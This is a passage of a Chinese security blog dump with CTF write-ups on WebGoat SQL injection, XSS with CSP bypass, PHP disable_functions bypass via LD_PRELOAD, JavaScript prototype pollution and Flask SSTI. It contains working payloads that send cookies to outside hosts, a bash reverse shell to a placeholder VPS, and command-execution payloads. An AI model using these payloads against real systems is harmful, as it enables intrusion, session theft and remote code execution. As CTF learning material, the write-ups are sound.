GenerationType.AUTO) private Long id; @Column(name&#x3D;&quot;real_name&quot;) private String realName; @Column(name&#x3D;&quot;nick_name&quot;) private String nickName; &#x2F;&#x2F; SET和GET方法&#125; DAO相关 1234567public interface AuthorRepository extends JpaRepository&lt;Author, Long&gt; &#123; List&lt;Author&gt; findAll(); @Query(&quot;from Author where id &#x3D; :id&quot;) Author findAuthor(@Param(&quot;id&quot;) Long id);&#125; 这个from的是对象名，感觉类似于预编译，能防止sql注入 SpringBoot查询findBy规则 所以上面的类似于fileByUsername()类似于 1... where username&#x3D;?1 既然不存在sql注入，继续回去看 createUser()后，在之前public WebGoatUser loadUserByUsername(String username)的return webGoatUser后打上断点，并执行下一步，跳转如下 在进行比较。 注册功能 全局搜索路由/registration 追踪validate() 之后就是addUser()，跟踪下发现也是利用封装好的save()插入数据库 说好的不安全呢？？原来是要登录进去才开始实验 SqlInjection全局搜索sqlinjection就能找到源码 查询的数据中department=Marketing才有回显 尝试联合注入 1select * from employees where department&#x3D;&#39;Marketing&#39; union select 1,2,3,&#39;Marketing&#39;,5,database() Something went wrong，应该是不支持这种语法，追踪下数据库 不知道是啥类型，测试发现盲注也不行，和mysql不是一个语法的。。这关似乎只是熟悉sql语法 challenge-9 sql语句已经给了，简单的拼接。。 查看挑战org/owasp/webgoat/sql_injection/advanced/SqlInjectionChallenge.java 明显问题出在checkUserQuery，是个布尔盲注，如果是mysql就不写了，这里写个脚本试试 这里用--可以注释 substr()可以截取字符串 构造下面的发现回显不同 12tom&#39;and &#39;1&#39;&#x3D;&#39;0&#39; -- tom&#39;and &#39;1&#39;&#x3D;&#39;1&#39; -- 是put请求，json格式返回 HTTP协议中PUT和POST使用区别 写个脚本 12345678910111213141516171819202122232425262728293031323334353637383940#!&#x2F;usr&#x2F;bin&#x2F;env python2# coding&#x3D;utf-8import requestsimport jsons &#x3D; requests.session()cookies &#x3D; &#123; &#39;JSESSIONID&#39; :&#39;XQ9kMiDyU_tr5apUdGewRRG4qIq7-5uQtiOObyRw&#39;&#125;url &#x3D; &quot;http:&#x2F;&#x2F;localhost:8080&#x2F;WebGoat&#x2F;SqlInjectionAdvanced&#x2F;challenge&quot;headers &#x3D; &#123; &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko&#x2F;20100101 Firefox&#x2F;70.0&#39;&#125;flag &#x3D; &quot;&quot;tmp &#x3D; 0for i in range(1, 100): if tmp &#x3D;&#x3D; 1: break tmp &#x3D; 1 for j in range(97, 127): payload &#x3D; &quot;password&quot; param &#x3D; &quot;tom&#39; and ascii(substr((&#123;&#125;),&#123;&#125;,1))&#x3D;&#123;&#125; and &#39;1&#39;&#x3D;&#39;1&quot;.format(payload, str(i), str(j)) print(param) data &#x3D; &#123; &#39;username_reg&#39;:param, &#39;email_reg&#39;:&#39;bb%40qq.com&#39;, &#39;password_reg&#39;:&#39;cc&#39;, &#39;confirm_password_reg&#39;:&#39;cc&#39; &#125; r &#x3D; requests.put(url&#x3D;url, headers&#x3D;headers, data&#x3D;data, cookies&#x3D;cookies) # r &#x3D; requests.post(url&#x3D;url, headers&#x3D;headers, cookies&#x3D;cookies, data&#x3D;data) c &#x3D; json.dumps(r.json()) # print(c) if &quot;already&quot; in c: tmp &#x3D; 0 flag &#x3D; flag + chr(j) print(flag) breakprint(flag) 最后，有空分析一下spring中的反序列化漏洞和FastJson反序列化漏洞，看了原理还是比较容易理解的。 参考链接： https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42149&amp;fromuid=365932 https://www.freebuf.com/vuls/214039.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"XSS&bypass CSP","slug":"XSS-bypass-CSP","date":"2020-02-27T02:01:25.000Z","updated":"2020-02-27T13:13:56.969Z","comments":true,"path":"2020/02/27/XSS-bypass-CSP/","link":"","permalink":"https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/","excerpt":"从几道题学习XSS以及一些相关绕过姿势","text":"从几道题学习XSS以及一些相关绕过姿势 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 hgame-Cosmos的聊天室1 hgame-Comcos聊天室2 RealWorld CTF2019-Mission Invisible RealWorld CTF2019-Hcorme CODEGATE 2020 CSP绕过 0ctf2018-h4xors.club2 参考链接： hgame-Cosmos的聊天室1环境关了，只能yy一下了==！ 过滤了所有闭合标签script、iframe等：re.sub(&quot;&lt;\\/?[^&gt;]+&gt;&quot;, &quot;&quot;, message),并转化为大写 用浏览器事件执行js，不闭合右标签时会自动补全 payload1 123&lt;svg&#x2F;onload&#x3D;&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47 编码内容window.open(&#39;http://vps-ip&#39;+document.cookie);// payload2 引入外部页面 这个做法仅限chrome 1&lt;link rel=\"import\"href=\"http://vps-ip/\" 但是需要解决跨域问题，使用flask或者SimpleHTTPServer开个服务即可 1234567891011from flask import *app = Flask(__name__)@app.route('/')def hello_world(): response = make_response(\"&lt;script&gt;window.open('http://vps-ip/'+document.cookie)&lt;/script&gt;\") response.headers['Access-Control-Allow-Origin'] = '*' return responseif __name__ == '__main__': app.run(host=\"0.0.0.0\",port=80) 本地测试 hgame-Comcos聊天室2将script替换为空，双写绕过，但是出现报错 Refused to execute inline script because it violates the following ContentSecurity Policy directive: “script-src ‘self’”. Either the ‘unsafe-inline’keyword, a hash (‘sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=’), or anonce (‘nonce-…’) is required to enable inline execution. 查看CSP策略 1Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; 它限制了内联 JS 脚本，并且限制了引入的静态资源文件只能从同域下加载。在实际应用中，遇到这种CSP ⼀般是找该站是否有文件上传点，上传⼀个内容为 alert(/xss/) 的图⽚再引用，也可以同源下有没有可以执行任意 JS 代码的 evil.js 文件。 本题中有⼀个接口 /send，它会返回过滤后的消息内容，我们可以利用 1&lt;scriscriptpt src&#x3D;&quot;&#x2F;send?message&#x3D;alert(1)&quot;&gt;&lt;&#x2F;scscriptript&gt; RealWorld CTF2019-Mission Invisible给了源码，核心是 123456789101112131415161718&lt;script&gt; function setElement(tag) &#123; tag = tag.substring(0, 1); var ele = document.createElement(tag) var attrs = getCookie(\"attrs\").split(\"&amp;\"); for (var i = 0; i &lt; attrs.length; i++) &#123; var key = attrs[i].split(\"=\")[0]; var value = attrs[i].split(\"=\")[1]; ele.setAttribute(key, value); &#125; document.body.appendChild(ele); &#125; var tag = getUrlParam(\"tag\"); setCookie(\"tag\", tag); setElement(tag);&lt;/script&gt; 可以构造一个标签并为其设置属性 只能使用a、p，但是需要使其自动触发，解决办法如下 1&lt;p onfocus&#x3D;&quot;alert(document.cookie)&quot; id&#x3D;&quot;1&quot; tabindex&#x3D;&quot;0&quot;&gt;&lt;&#x2F;p&gt; chrome测试成功 之后常规打cookie即可 RealWorld CTF2019-Hcorme 题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。 两个限制：XSS Auditor、Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; Hardold师傅的思路—&gt;utf-16编码绕过 因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。 猜测是类似截断的原理，从而bypass XSS Auditor 绕过CSP，是利用JSONP直接把js代码挂载到本地的script 会进行两次资源请求，第二次的资源类型是script 1print(quote((&#39;&lt;script&#x2F;src&#x3D;?callback&#x3D;alert(1)&gt;&lt;&#x2F;script&gt;&#39;).encode(&#39;utf-16&#39;))) CODEGATE 2020 CSP绕过前面是一个简单的正则绕过，发现存在CSP script-src &#39;none&#39; view.php提交到api.php，格式为name/p1/p2，可以设置header 解决办法：http状态码置为102时，CSP不会执行 颖奇师傅的payload 12345678910#author: 颖奇L'Amore#www.gem-love.comimport base64csp1 = str(base64.b64encode(b'header') ,encoding = \"utf8\")csp2 = str(base64.b64encode(b'HTTP/1.1'),encoding = \"utf8\")csp3 = str(base64.b64encode(b'102'),encoding = \"utf8\")name = str(base64.b64encode(b'body'),encoding = \"utf8\")xss = str(base64.b64encode(b'&lt;script\\n&gt;window.open(\"http://gem-love.com:12345/?\"+document.cookie);&lt;/script\\n&gt;'),encoding = \"utf8\")p3 = \"MQ==\" #p3 is uselessprint('|&#123;&#125;,&#123;&#125;,&#123;&#125;|&#123;&#125;,&#123;&#125;,&#123;&#125;'.format(csp1,csp2,csp3,name,xss,p3)) 0ctf2018-h4xors.club2发现看不懂==！以后再来补 最后给个分享个链接，遇到问题可以查一查：CSP策略及绕过方法 参考链接： https://www.anquanke.com/post/id/186707 https://github.com/vidar-team/Hgame2020_writeup/ https://www.gem-love.com/ctf/1329.html#CSP http://www.wupco.cn/?p=4408","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"https://glotozz.github.io/tags/xss/"}]},{"title":"从一道题学习bypass disable_func","slug":"从一道题学习bypass-disable-func","date":"2020-02-26T00:07:29.000Z","updated":"2020-02-27T10:30:11.142Z","comments":true,"path":"2020/02/26/从一道题学习bypass-disable-func/","link":"","permalink":"https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/","excerpt":"ctf和渗透经常会遇到需要bypass disable_func，借下面这道题学习下原理","text":"ctf和渗透经常会遇到需要bypass disable_func，借下面这道题学习下原理 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 TCTF wallbreaker easy 一、dl()-拓展库绕过 二、imap_mail() 三、putenv() 四、ini_set 五、apache_setenv 参考链接： TCTF wallbreaker easy 很明显，给了我们一个后门，提示需要用Imagick来绕过disable_function，设置了open_basedir，先看看phpinfo() 对比禁用列表 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link =================分割线 加个error_log 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link,error_log =================分割线 函数对应的利用点 1234567常规绕过: exec、shell_exec、system、passthru、popen、proc_openld_preload绕过: mail、imap_mail、error_log、mb_send_mailpcntl_execimap_openfastcgicomapache mod-cgi 还存在下面5个 12345dlimap_mailputenvini_setapache_setenv 那么就对这个5个一一分析 一、dl()-拓展库绕过 实现方法参考：https://cloud.tencent.com/developer/article/1141142 版本 说明 7.0.0 PHP-FPM 模式下已禁用 dl()。 5.3.9 尽管不推荐，但 PHP-FPM 模式下启用了 dl()。 5.3.0 由于稳定性，dl() 在某些 SAPI 中被禁用。仅仅允许 dl() 的 SAPI 为 CLI 和 Embed。 使用 扩展加载指令 作为替代。 SAPI（Server Application Programming Interface）服务器应用程序编程接口，即PHP与其他应用交互的接口，PHP脚本要执行有很多方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。 SAPI提供了一个和外部通信的接口，常见的SAPI有：cgi、fast-cgi、cli、apache模块的DLL、isapi 1Server API FPM&#x2F;FastCGI 这里未开启dl，遂作罢 二、imap_mail() https://www.exploit-db.com/exploits/35146 适用于PHP &lt; 5.6.2的，遂作罢 三、putenv()putenv()可以设置环境变量 1putenv ( string $setting ) : bool 添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。 主要是和LD_PRELOAD打一套组合拳 LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用 1.制作一个恶意shared libraries2.使用putenv设置LD_PRELOAD为恶意文件路径3.使用某个php函数，触发specific shared library4.成功进行RCE 寻找一个能触发这个二进制文件的php函数 最常见的是mail() 123&lt;?php mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; strace一下 1strace -f -e execve php a.php 得到 查看程序可能调用的系统API 1readelf -Ws &#x2F;usr&#x2F;sbin&#x2F;sendmail 有很多函数可以使用，这里可以选择geteuid() hack.c 123456789101112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123; system(&quot;ls &#x2F; &gt; &#x2F;tmp&#x2F;sky&quot;);&#125;int geteuid() &#123; if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); payload();&#125; 这里要生成 shared libraries 12gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so 修改a.php 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; 运行下，发现/tmp下生成了恶意文件，查看 进阶 即使没有安装sendmail也可以RCE，删除sendmail并修改hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;ls&quot;);&#125; 所以当我们最开始将evil shared library load上后，就会触发__attribute__ ((__constructor__)) ，即使后面出现No such file or dicectory 本题中mail()被disable_func限制，提示php-imagick扩展 源码：https://github.com/ImageMagick/ImageMagick 因为知道要调用ffmpeg，github搜索即可 Makefile.nt 搜索mpeg 这里可以WMV为例 a.php 123&lt;?php $img &#x3D; new Imagick(&#39;sky.wmv&#39;);?&gt; 之后就是和上面类似的查看是否调用 注意的是wmv文件必须存在，否则无法调用ffmpeg hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;d4dabdbc73b87e364e29e60c60a92900&#x2F;flag&quot;);&#125; 12gcc -c -fPIC hack1.c -o skygcc --share sky -o sky.so 本题中，先上传一个sky.so和1.wmv到/tmp/sandbox下 执行 12putenv(&quot;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;sky.so&quot;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;1.wmv&#39;); 其他解法： 一、覆盖delegate.xml 因为我们要执行/readflag，那么应该是通过系统命令，那么既然delagate.xml里面能够自定义要执行的命令，我们可以直接写delegate来让imagick当处理某个文件后缀时加载我们的delegate.xml，然后执行我们的command即可。 123&lt;delegatemap&gt; &lt;delegate decode&#x3D;&quot;ps:alpha&quot; command&#x3D;&quot;sh -c &quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&quot;&quot;&#x2F;&gt;&lt;&#x2F;delegatemap&gt; 再执行 12putenv(&#39;MAGICK_CONFIGURE_PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); 二、覆盖子进程 比上一种更加深入一层 在delegate.xml定义中在decode ept文件时会调用gs，只要指定path为我们的gs的文件夹路径即可达成劫持的效果。 gs.c 12345678#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; unsetenv(&quot;PATH&quot;); const char* cmd &#x3D; getenv(&quot;CMD&quot;); system(cmd); return 0;&#125; 编译后命名为gs即可，再上传个1.ept 1234putenv(&#39;PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);putenv(&#39;CMD&#x3D;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&#39;);chmod(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;gs&#39;,&#39;0777&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); 三：利用 error_log 函数启动 sendmail 这里我们要用到的就是当 error_log 的第二个参数 message_type 的值为 1 的时候，会调用mail 函数的同一个内置函数(会执行sendmail 命令)的特性。 只需要将第一个mail()例子的hack.c修改成如下即可 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); error_log(&#39;&#39;,1);?&gt; 四、ini_set可以用来绕过open_basedir 1chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;)); 五、apache_setenv apache_setenv — 设置 Apache 子进程环境变量 当设置了某 Apache 环境变量, 相应的 $_SERVER 变量不会改变。 搜了下好像没有直接相关的漏洞==！ 最后放上两个常用的bypass链接 some exploits in php7 bypass disable_functions via LD_PRELOAD 参考链接： https://github.com/l3m0n/Bypass_Disable_functions_Shell https://www.cnblogs.com/tr1ple/p/11279895.html#Bjhbm2Rh https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/#%E5%90%8E%E8%AE%B0","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://glotozz.github.io/tags/bypass/"}]},{"title":"JavaScript原型链污染","slug":"JavaScript原型链污染","date":"2020-02-25T02:51:11.000Z","updated":"2020-02-27T10:52:27.692Z","comments":true,"path":"2020/02/25/JavaScript原型链污染/","link":"","permalink":"https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。","text":"这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 原理 公益赛Ez epress Codebreaking-thejs 总结 参考链接： 原理原型 123function A(name)&#123; this.name &#x3D; &#39;a&#39;;&#125; 在javascript中,每个对象的都有一个指向他的原型(prototype)的内部链接，这个原型对象又有它自己的原型，直到null为止 在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype。同时，在js中只有类才有prototype属性，而对象却没有，对象有的是__proto__和类的prototype对应。 且二者是等价的 类 数组 上面就是两条完整的原型链，都会指向object，再指向null 再举个原型链搜索的例子 1234567function y()&#123; this.a &#x3D; &#39;a&#39;; this.b &#x3D; &#39;b&#39;;&#125;j &#x3D; new y;y.prototype.c &#x3D; &#39;c&#39;;console.log(j.c) 这个例子中先new了一个对象j，之后再y中添加c，但是仍然打印出了c 当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined 再举个原型链污染的例子 123456a &#x3D; &#123;&#39;b&#39;:1&#125;console.log(a.b)a.__proto__.b &#x3D; 2console.log(a.b)c &#x3D; &#123;&#125;console.log(c.b) 修改a的原型即Object的属性b=2，第一次打印a.b根据搜索顺序为b=1，之后new了一个字典对象即Object，因此属性b=2 再举个原型链污染触发的例子 1234567891011121314151617function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] &#x3D; source[key] &#125; &#125;&#125;let o1 &#x3D; &#123;&#125;;let o2 &#x3D; &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;;merge(o1,o2);console.log(o1.a,o1.b);o3 &#x3D; &#123;&#125;;console.log(o3.b); 当key为__proto__即可原型链污染 理论上执行：o1.a = 1 o1.__proto__.b = 2 输出应该是1，2 和 2 执行一下 原因是这里o2 = {a:1,&quot;__proto__&quot;:{b:2}};是给o2的原型赋值属性b=2，相当于 o2 = {a:1,b:2} 解决这个问题需要使__proto__作为键名 o2 = JSON.parse(&#39;{&quot;a&quot;:1,&quot;__proto__&quot;:{&quot;b&quot;:2}}&#39;) Nodejs的RCE 调用child_process模块来执行系统命令 12global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;)global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;) 利用方式一般是object的某个属性为上面的模块并被调用 上面都是原理，下面分析几道题 公益赛Ez epressregister需要满足小写不等于admin，之后toUpperCase()存入session，再与ADMIN比较 javascript大小写特性绕过： https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 成功登录后，继续分析代码，发现 1234567891011121314151617181920const merge &#x3D; (a, b) &#x3D;&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] &#x3D; b[attr]; &#125; &#125; return a&#125;const clone &#x3D; (a) &#x3D;&gt; &#123; return merge(&#123;&#125;, a);&#125;...req.session.user.data &#x3D; clone(req.body);router.get(&#39;&#x2F;info&#39;, function (req, res) &#123; res.render(&#39;index&#39;,data&#x3D;&#123;&#39;user&#39;:res.outputFunctionName&#125;);&#125;) /action污染原型链 /info触发污染的原型链 设置object的outputFunctionName的属性：{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;xxx&quot;}} payload 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag\\&quot;&#39;);var __tmp2&quot;&#125;&#125; 失败了，就想调试下js，本地搭建 12#安装模块npm install 发现没有提供端口启动，原文件是利用bin/www里面启动的，为了方便直接添加 1234567&#x2F;&#x2F;监听端口为3000var server &#x3D; app.listen(3000, function () &#123; var host &#x3D; server.address().address; var port &#x3D; server.address().port; console.log(&#39;Example app listening at http:&#x2F;&#x2F;%s:%s&#39;, host, port);&#125;); node --inspect --debug-brk app.js启动即可利用chrome自带的调试 nodejs调试 未merge()前 merge()后 看下源码才注意到req.session.user.data = clone(req.body); 是整个body。。。修改请求体即可 之前的payload失败是因为没有用json格式发送==！ 访问/info触发原型链，访问/flag下载即可 Codebreaking-thejsserver.js 123456789101112131415161718192021222324252627282930313233343536373839404142const fs &#x3D; require(&#39;fs&#39;)const express &#x3D; require(&#39;express&#39;)const bodyParser &#x3D; require(&#39;body-parser&#39;)const lodash &#x3D; require(&#39;lodash&#39;)const session &#x3D; require(&#39;express-session&#39;)const randomize &#x3D; require(&#39;randomatic&#39;)const app &#x3D; express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;&#x2F;static&#39;, express.static(&#39;static&#39;))app.use(session(&#123; name: &#39;thejs.session&#39;, secret: randomize(&#39;aA0&#39;, 16), resave: false, saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; &#x2F;&#x2F; define the template engine fs.readFile(filePath, (err, content) &#x3D;&gt; &#123; if (err) return callback(new Error(err)) let compiled &#x3D; lodash.template(content) let rendered &#x3D; compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;&#x2F;&#39;, (req, res) &#x3D;&gt; &#123; let data &#x3D; req.session.data || &#123;language: [], category: []&#125; if (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123; data &#x3D; lodash.merge(data, req.body) req.session.data &#x3D; data &#125; res.render(&#39;index&#39;, &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () &#x3D;&gt; console.log(&#96;Example app listening on port 3000!&#96;)) 使用 lodash 实现了一个简单的 ejs 模版引擎，在请求的时候渲染。 lodash这个模块提供了两个工具lodash.template和lodash.merge，分别可用来进行原型链污染和原型链触发 merge就可以想到之前分析的原型链污染的触发点，因为这是一个express框架，支持Json直接传输数据，并且接收的参数为req.body lodash.template的源码 https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089 1234var result &#x3D; attempt(function() &#123; return Function(importsKeys, sourceURL + &#39;return &#39; + source) .apply(undefined, importsValues);&#125;); 追踪sourceURL 1var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\\n&#39; : &#39;&#39;; 其中 option 为我们在模版引擎中，渲染的值。这里读取其中的 sourceURL 属性的值，我们就可以通过这里触发原型污染 payload 1&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\\r\\nreturn e &#x3D;&gt;&#123;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;);&#125;&quot;&#125;&#125;&#125; 总结简单学习了JavaScript原型链污染的原理以及两道简单的题，下一步学习可以是一些源码更加复杂，或者与其他漏洞结合利用。 参考链接： https://www.anquanke.com/post/id/176884 https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","categories":[],"tags":[{"name":"js","slug":"js","permalink":"https://glotozz.github.io/tags/js/"}]},{"title":"flask模版注入","slug":"flask模版注入","date":"2020-02-24T01:11:15.000Z","updated":"2020-02-27T10:55:16.421Z","comments":true,"path":"2020/02/24/flask模版注入/","link":"","permalink":"https://glotozz.github.io/2020/02/24/flask%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/","excerpt":"比赛时遇到flask ssti，遂复习一下","text":"比赛时遇到flask ssti，遂复习一下 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 简述 Python2 Python3 Some Tricks（测试环境为Py2） 总结 参考链接： 简述 漏洞原理参考 漏洞原理用一句话概括：不正确的使用flask中的render_template_string()导致的SSTI，并且模板内容直接受用户控制 这篇文章主要是借flask SSTI复习下python沙盒逃逸，整理下payload，理论上不同机器、不同python版本的payload是不尽相同的。 测试代码 1234567@app.route('/')def test(): code = request.args.get('id') html = ''' &lt;h3&gt;%s&lt;/h3&gt; '''%(code) return render_template_string(html) 两种启动方式： flask run --host=0.0.0.0，需要启动的时候设置host，app.run()中更改无效 python app.py，在app.run()中设置host，切换python版本比较方便 确认正常访问 全局变量 ,比较常见的读取是SECRET_KEY 文件读取/命令执行 无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类&lt;type &#39;object&#39;&gt;，再寻找子类，最后找到我们需要用到的相应模块 几个要用到的魔术方法 12345678__class__ 返回类型所属的对象__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__ 返回该对象所继承的基类&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__ 类的初始化方法__globals__ 对包含函数全局变量的字典的引用 Python2先测试Python 2.7.17 需要先选取一个类，几种常见的类&#39;&#39;、request、[]、() 1、获取类对象 123456789&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;&gt;&gt;&gt; import request&gt;&gt;&gt; request.__class__&lt;type &#39;module&#39;&gt;&gt;&gt;&gt; [].__class__&lt;type &#39;list&#39;&gt;&gt;&gt;&gt; ().__class__&lt;type &#39;tuple&#39;&gt; 2、寻找基类object 12345678910111213&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; request.__class__.__mro__(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; ().__class__.__mro__(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;type &#39;object&#39;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &#39;object&#39;&gt; object在最底层故在列表中的最后，通过__mro__[-1]可以获取到 3、寻找可用的引用 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type 